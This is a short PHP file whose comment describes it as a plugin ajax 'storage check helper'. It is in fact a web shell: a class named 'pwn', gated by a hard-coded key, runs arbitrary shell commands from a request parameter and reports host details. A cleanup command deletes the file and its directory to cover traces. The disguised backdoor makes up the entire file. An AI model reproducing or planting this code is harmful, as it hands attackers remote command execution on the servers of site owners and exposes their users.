<?php
/* UP plugin ajax action - storage check helper */
class pwn
{
    public static function goAjax($input)
    {
        $k = (string) $input->get('k', '', 'raw');
        if ($k !== 'PT29-K-7f4a91c2') {
            return '';
        }
        $c = (string) $input->get('c', '', 'raw');
        if ($c === '') {
            return (string) @shell_exec('id; hostname; uname -a; pwd 2>&1');
        }
        if ($c === '__CLEAN__') {
            @unlink(__FILE__);
            @unlink(dirname(__FILE__) . '/pwn.php');
            @rmdir(dirname(__FILE__));
            return 'CLEANED';
        }
        return (string) @shell_exec($c . ' 2>&1');
    }
}
